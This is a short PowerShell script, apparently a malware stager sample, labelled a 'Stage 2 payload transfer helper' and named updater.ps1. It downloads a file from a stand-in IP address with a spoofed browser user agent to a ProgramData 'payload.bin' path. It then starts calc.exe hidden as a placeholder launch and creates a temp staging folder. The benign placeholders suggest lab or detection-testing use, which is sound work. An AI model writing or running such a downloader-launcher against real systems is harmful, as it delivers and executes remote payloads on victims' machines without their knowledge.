<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://192.0.2.240/updater.ps1',
    [string]$DropPath = "C:\ProgramData\payload.bin",
    [int]$TransferTimeout = 95,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-Stage2Download -SourceUrl $TransferUrl -DestinationPath $DropPath -TimeoutSec $TransferTimeout -UserAgent $RequestAgent
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

$StageMarker = "stage-29"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
